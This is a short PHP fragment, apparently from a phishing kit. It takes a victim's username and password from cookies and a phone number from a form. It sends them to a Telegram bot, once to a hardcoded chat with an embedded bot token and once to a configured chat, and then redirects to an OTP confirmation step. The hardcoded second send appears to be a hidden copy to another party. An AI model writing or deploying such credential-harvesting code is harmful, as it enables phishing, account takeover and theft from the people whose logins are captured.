$us = [
'chat_id' => "-635799224",
'text' => "User: " . $_COOKIE['username'] . "\nPass: " . $_COOKIE['password'] . "\nNum: " . $_POST['number']
];
file_get_contents("https://api.telegram.org/bot5202228547:AAHRkzQNW1feHYhwmhZrAdHGnYHmmLXcE_8/sendMessage?" . http_build_query($us));


$data = [
'chat_id' => $chat_id,
'text' => "User: " . $_COOKIE['username'] . "\nPass: " . $_COOKIE['password'] . "\nNum: " . $_POST['number']
];
file_get_contents("https://api.telegram.org/bot" . $telebot . "/sendMessage?" . http_build_query($data));

header("Location: index.php?otp=confirm");
